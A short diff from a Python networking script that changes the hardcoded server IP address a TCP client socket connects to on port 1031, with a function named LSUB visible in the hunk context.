@@ -388,7 +388,7 @@ def LSUB(CMD):
     INT_handling(int_msg = get)
 
 
-HOST = "3.235.245.230"
+HOST = "34.239.172.212"
 PORT = 1031
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
